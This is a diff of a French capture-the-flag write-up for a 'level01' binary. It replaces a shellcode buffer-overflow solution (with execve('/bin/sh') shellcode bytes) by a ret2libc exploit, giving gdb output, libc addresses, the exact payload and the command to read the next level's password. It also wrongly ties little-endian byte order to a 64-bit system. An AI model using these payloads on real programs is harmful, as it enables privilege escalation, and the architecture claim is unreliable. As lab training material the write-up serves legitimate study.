@@ -1,56 +1,95 @@
-On va lancer GDB pour analyser les isttructions assembleur avec la commande:
-"gdb ./level01"
+Ayant trouve un nom d'utilisateur "dat_wil" et un mot de passe "admin", on tente de les rentrer.
+Le mot de passe ne semble pas fonctionner. La fonction ne disposant pas d'un appel system, nous allons devoir faire appel à une attaque ret2libc.
 
-Pour commencer, noous allons prendre connaissance des eventuelles fonctions autres que main dans ce programme avec:
-"info functions"
+On trouve si on peut faire crasher le programme avec une trop grosse chaine de caractere pour le nom d'utilisateur et le mot de passe.
+En effectuant de nombreux tests manuels, on se rend compte que le mot de passe entraine un segfault si jamais on tape 80+ caracteres.
+On a donc l'offset pour envoyer un payload.
 
-On tombe en plus des fonctions utilisees deppuis des librairies par defaut, sur les fonctions personnalisees "verify_user_name" et "verify_user_pass"
+Pour que ce payload soit utile, on va devoir acceder à certaines informations.
+On demarre donc le programme avec "r" dans gdb.
 
-"disas verify_user_name"
-va nous permettre de voir les instructions de la premiere fonction.
-On va imprimer les valeurs des variables presentes unes a unes dans cette fonction avec la commande print, pour verifier leur contenu.
+On fait crash le programme lors de la saisie dumot de passe.
 
-"print (char * ) 0x80486a8 "
-va nous donnner ce qui semble etre le nom d'utilisateur attendu, soit "dat_wil".
+Suite au crash, on tape la commande
+```info proc map```
 
-"disas verify_user_pass"
-va nous permettre de voir les instructions de la seconde fonction.
-On va egalement imprimer les valeurs des variables presentes unes a unes dans cette fonction avec la commande print, pour verifier leur contenu.
+On a alors le tableau suivante:
+```process 1888
+Mapped address spaces:
 
-"print (char * ) 0x80486b0"
-va nous donnner ce qui semble etre le mot de passe attendu, soit "admin".
+	Start Addr   End Addr       Size     Offset objfile
+	 0x8048000  0x8049000     0x1000        0x0 /home/users/level01/level01
+	 0x8049000  0x804a000     0x1000        0x0 /home/users/level01/level01
+	 0x804a000  0x804b000     0x1000     0x1000 /home/users/level01/level01
+	0xf7e2b000 0xf7e2c000     0x1000        0x0
+	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
+	0xf7fcc000 0xf7fcd000     0x1000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcd000 0xf7fcf000     0x2000   0x1a0000 /lib32/libc-2.15.so
+	0xf7fcf000 0xf7fd0000     0x1000   0x1a2000 /lib32/libc-2.15.so
+	0xf7fd0000 0xf7fd4000     0x4000        0x0
+	0xf7fd8000 0xf7fdb000     0x3000        0x0
+	0xf7fdb000 0xf7fdc000     0x1000        0x0 [vdso]
+	0xf7fdc000 0xf7ffc000    0x20000        0x0 /lib32/ld-2.15.so
+	0xf7ffc000 0xf7ffd000     0x1000    0x1f000 /lib32/ld-2.15.so
+	0xf7ffd000 0xf7ffe000     0x1000    0x20000 /lib32/ld-2.15.so
+	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
+```
 
-Le nom d'utilisateur fonctionne, pas le mot de passe... C'est un probleme.
+Pour chaque ligne, on tape la commande du debut a la fin de l'addresse, pour retrouver la string "/bin/sh": (0xf7f897ec)
+```(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
+0xf7f897ec
+1 pattern found.
+```
 
-Par ailleurs, le nom d'utilisateur doit compter uniquement "dat_wil" pour les 7 premiers caracteres, mais ecrire de la donnee apres ne semble pas poser de probleme:
-On peut ecrire un shellcode grace au nom d'utilisateur, potentiellement.
 
-En regardant a nouveau dans "info functions", on se rend compte que la fonction system n'est pas appelle, ce qui signifie que l'on va devoir utiliser un shellcode
-pour l'appeller et lire notre fichier .pass. Nous allons donc devoir certainement proceder a un buffer overflow.
+On cherche l'adresse de la fonction system avec la commande: (0xf7e6aed0)
+```
+(gdb) info function system
+All functions matching regular expression "system":
 
-On va alors utiliser la commande suivante pour ecrire notre identifiant, puis l'inserer, et enfin tester un mot de passe pour determiner le nombre de caractere 
-necessaire pour faire seglfault notre programme:
+Non-debugging symbols:
+0xf7e6aed0  __libc_system
+0xf7e6aed0  system
+0xf7f48a50  svcerr_systemerr
+```
 
-"(python -c "print 'dat_wil' + '\n' + 'A' * 80") | ./level01"
+On cherche l'adresse de la fonction exit avec la commande: (0xf7e5eb70)
+```
+(gdb) info function exit
+All functions matching regular expression "exit":
 
-En tapant un mot de passe long lors de l'utilisation du programme level01, on se rend compte que celui segfault effectivement, plus precisement a partir de 80 caracteres.
-On a alors son offset, ce qui nous permettra d'ecrire un shellcode a partir de la.
+Non-debugging symbols:
+0xf7e5eb70  exit
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+```
 
-Egalement, en regardant avec la commande:
+Le payload sera constitué de la manière suivante: offset ('*' * 80) + "system" + "exit" + "/bin/sh"
+```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/payload```
 
-"info variables"
+```cat /tmp/payload - | ./level01```
 
-On se rend compte que la variable "a_user_name" dont l'adresse est "0x0804a040", nous est familiere: elle stocke notre nom d'utilisateur dont l'adresse est "0x80486a8".
+```cat /home/users/level02/.pass```
 
-On peut alors executer notre shellcode avec la commande qui suit, qui se decompose de la maniere suivante:
 
-- On entre notre nom d'utilisateur attendu et un shellcode qui va executer execve("/bin/sh") dans notre premier champ.
-- On decale notre l'entree de notre champ pass par la taille de notre offset (80), afin de commencer a lire dans la memoire.
-- on appelle notre adresse memoire de nom d'utilisateur decale de 7 caracteres afin d'executer directement le shellcode.
-- On utilise un cat pour que notre shellcode puisse attendre et executer nos instructions futures.
+Explications supplementaires:
 
-"(python -c "print 'dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80' + '\n' + 'a' * 80 + '\x47\xa0\x04\x08'"; cat) | ./level01"
+Il est à noté que l'appel à exit est optionnel, en effet, ligne suivante fonctionne egalement:
 
-"whoami"
-"cd ../level02"
-"cat .pass"
+```python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\x00\x00\x00"+"\xec\x97\xf8\xf7"' > /tmp/payload```
+
+Exit permet juste de quitter le programme proprement. Il est par contre imperatif de disposer d'une adresse en l'appel à system et à son argument /bin/sh.
+En effet, l'assembleur a besoin de disposer d'une adresse de sortie après l'appel d'une fonction, avant de recevoir les arguments.
+
+Ne pas indiquer d'une adresse entre system et /bin/sh fera qu'il n'y aura pas d'arguments et que /bin/sh sera la fonction de sortie, ce qui posera problème.
+
+Enfin, vis à vis de l'ordre inversé des chiffres des adresses, cela est dû à l'architecture 64 bits de notre environnement, qui nous fait passer au format de lecture little endian.
+
+Source: https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/return-to-libc-ret2libc
